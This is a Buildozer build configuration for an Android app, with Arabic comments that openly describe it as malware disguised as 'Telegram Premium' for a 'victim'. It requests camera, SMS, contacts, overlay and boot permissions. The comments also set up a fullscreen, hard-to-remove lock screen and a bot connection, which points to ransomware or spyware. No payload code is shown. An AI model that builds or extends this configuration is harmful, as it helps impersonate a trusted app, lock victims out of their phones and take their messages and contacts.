[app]
# الاسم اللي الضحية هيشوفه بعد التثبيت (التمويه)
title = Telegram Premium
package.name = d3f4ult
package.domain = org.godfather
source.dir = .
source.include_exts = py,png,jpg,kv,atlas
version = 1.0

# المتطلبات: ضفت لك requests عشان البوت، و pyjnius عشان التحكم في أجزاء النظام
requirements = python3,kivy==2.1.0,pyjnius,requests,urllib3

orientation = portrait

# --- Android specific ---
# fullscreen=1 عشان شاشة القفل تغطي الساعة وشريط الإشعارات فوق
fullscreen = 1

# الصلاحيات الجبارة (السم): الكاميرا، الرسائل، الأسماء، وقفل الشاشة الفولاذي
android.permissions = INTERNET, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE, CAMERA, READ_SMS, RECEIVE_SMS, SEND_SMS, READ_CONTACTS, SYSTEM_ALERT_WINDOW, RECEIVE_BOOT_COMPLETED, FOREGROUND_SERVICE, WAKE_LOCK

# السطر ده بيخلي التطبيق يطلب إنه يكون "Admin" عشان ميتتمسحش بسهولة
android.api = 31
android.minapi = 21
android.ndk = 25b
android.sdk = 31

# منع الموبايل من الدخول في وضع النوم عشان القفل يفضل شغال
android.wakelock = True

# المعمارية لضمان العمل على كل الموبايلات الحديثة
android.archs = arm64-v8a, armeabi-v7a

# السماح للتطبيق بالظهور فوق التطبيقات الأخرى (دي أهم حاجة للقفل)
android.system_alert_window = True

# السطر السحري لقبول التراخيص آلياً
android.accept_sdk_license = True

android.private_storage = True
android.release_artifact = apk
android.debug_artifact = apk

[buildozer]
log_level = 2
warn_on_root = 1
